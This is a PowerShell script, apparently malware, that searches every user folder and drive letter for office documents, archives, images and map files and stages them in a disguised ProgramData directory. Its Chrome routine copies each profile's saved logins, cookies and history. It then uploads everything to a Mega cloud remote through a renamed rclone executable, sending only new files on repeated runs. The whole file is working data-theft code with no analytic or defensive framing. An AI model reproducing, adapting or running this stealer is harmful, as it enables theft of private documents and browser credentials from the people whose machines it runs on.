function Invoke-StreamCopy {
param (
    [switch]$First,
    [switch]$Chrome,
    [switch]$Stream,
    [string]$objName,
    [string]$destMega
)


function SearchAndCopy ($LocalPath, $Second) {
    
    $num = 1
    $files = (Get-ChildItem -Path $LocalPath -Recurse -Include $exts -Exclude "~$*") | Where-Object {$_.Length -lt $size}
    if ($Second) { $files = $files | Where-Object {$_.LastWriteTime -gt (Get-Date).AddHours(-200) } }
    
    foreach ($file in $files) {
        $hash = (Get-FileHash -Algorithm MD5 $file).hash 
        if ((Select-String -path $hashfile -Pattern $hash) -eq $null) {
            $file.FullName | Out-File -Encoding utf8 -FilePath $logfile -Append
            if (Test-Path -Path (Join-Path $allDestDir $file.Name)) {
                Copy-Item $file.FullName -Destination ($allDestDir + '\' + $file.BaseName + "_$num" + $file.Extension) -Recurse -Container
                if ($Second) {
                    New-Item $sendDestDir -ItemType Directory -ea 0 
                    Copy-Item $file.FullName -Destination ($sendDestDir + '\' + $file.BaseName + "_$num" + $file.Extension) -Recurse -Container 
                }
                $num+=1
            } else {
                Copy-Item $file.FullName -Destination $allDestDir
                if ($Second) { New-Item $sendDestDir -ItemType Directory -ea 0 ; Copy-Item $file.FullName -Destination $sendDestDir }
            }
            $hash | Out-File -Encoding utf8 -FilePath $hashfile -Append
        }  else { 
            ($file.FullName + " : --- OLD FILE ---") | Out-File -Encoding utf8 -FilePath $logfile -Append
           }
        }
}

function Secure-Copy ($param) {

        foreach ($usersDir in (gci $srcdir)) {
            foreach ($deskDir in $deskDirs) { 
                SearchAndCopy -LocalPath (Join-Path $usersDir.FullName $deskDir) -second $param 
            }
        }
        foreach ($allPath in $allPaths) { 
            if (Test-Path -Path $allPath) {
                SearchAndCopy -LocalPath $allPath -second $param 
            }
    }

function Chrome-Copy ($usersDir) {
    
    #$user = (((Split-Path $usersDir.fullName -Leaf) -Replace '\.[^\.]*$') + '\')
    $chromeUserDir = ($chromeDestDir + $usersDir.Name + '\'); New-Item $chromeUserDir -ItemType Directory -ea 0
    $chromeUserDataDir = ($usersDir.FullName + '\' + '\AppData\local\Google\chrome\user data\')
    Copy-Item -Force ($chromeUserDataDir + '\Local State') -Destination ($chromeUserDir)

    foreach ($profile in (gci -Path $chromeUserDataDir -recurse | Where-Object {$_.BaseName -eq 'History'})) {
        $chromeProfileDir = ($chromeUserDir + $profile.Directory.Name + '\'); New-Item $chromeProfileDir -ItemType Directory -ea 0
        Copy-Item -Force ($profile.Directory.FullName + '\History') -Destination $chromeProfileDir
        Copy-Item -Force ($profile.Directory.FullName + '\Login Data') -Destination $chromeProfileDir
        Copy-Item -Force ($profile.Directory.FullName + '\Network\Cookies') -Destination $chromeProfileDir
    }
}


[bool]$second = $false
$baseDir = 'C:\ProgramData\Waves\'; New-Item $baseDir -ItemType Directory -ea 0
$appsDir = $baseDir + 'Apps\'; New-Item $appsDir -ItemType Directory -ea 0
$srcdir = 'C:\Users\'
$allPaths = @('A:','B:','D:','E:','F:','G:','H:','I:','J:','K:','L:','M:','N:','O:','P:','Q:','R:','S:','T:','U:','V:','W:','Z:','X:','Y:')
$destDir = ($baseDir + 'Docs\') ; New-Item $destDir -ItemType Directory -ea 0

$allDestDir = ($destDir + 'ALL\'); New-Item $allDestDir -ItemType Directory -ea 0
$hashfile = ($destDir + 'checksum.txt') ;New-Item $hashfile -ItemType File -ea 0
$logfile = ($destDir + 'logs.txt'); New-Item $logfile -ItemType File -ea 0


$currDateTime = (Get-Date -UFormat %d.%m.%y..%H.%M)
$currDate = (Get-Date -UFormat %d.%m.%y)
$currYear = (Get-Date -UFormat %Y)
$size = 100*1024*1024
$exts = ('*.doc','*.docx','*.rtf','*.xls','*.xlsm','*.xlsx','*.pdf','*.txt','*.zip','*.rar','*.7z','*.jpg','*.kme','*.kml','*.kmz','*.jpeg','*.png','*.bmp','*.ppt','*.pptx','*.odt','*.csv')
$archname = $env:COMPUTERNAME + '_' + $CurrDateTime + '.zip'
$deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')

    if ($objName -eq "") { $objName = $env:COMPUTERNAME }

    if ($destMega -eq "") { $destMega = "ZSUDocs" }

    if (($First -ne $true) -and ($Stream -ne $true) -and ($Chrome -ne $true)) {echo "You must specify at least one of <First> or <Stream>"}

    if ($Stream -OR $First) { 
        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
        $CurrDateTime | Out-File -Encoding utf8 -FilePath $logfile -Append
        echo '<><><><><><><><><><><><><><><><><><><><><><><><><><><>' | Out-File -Encoding utf8 -FilePath $logfile -Append
    }

    if ($Chrome) {
        $chromeDestDir = ($destDir + 'Chrome\'); New-Item $chromeDestDir -ItemType Directory -ea 0 
        foreach ($usersDir in (gci $srcdir)) {
            if ($usersDir.Name -eq "Public") { continue }
            Chrome-Copy ($usersDir)
        }
    }

    if ($First) {
        Secure-Copy -param $false
        echo "Upload Documents . . ." 
        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
    }
    
    if ($Stream) {
        $etalonhash = (Get-FileHash -Algorithm MD5 $hashfile).hash
        $sendDestDir = $destDir + $objName + '_' + $CurrDateTime
        
        Secure-Copy -param $true

        $newhash = (Get-FileHash -Algorithm MD5 $hashfile).hash
        if ($newhash -ne $etalonhash) {
            echo "Upload Documents . . ."
            &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $sendDestDir mgp:/$destMega/$currYear/$currDate/$objName/
        }
    }
}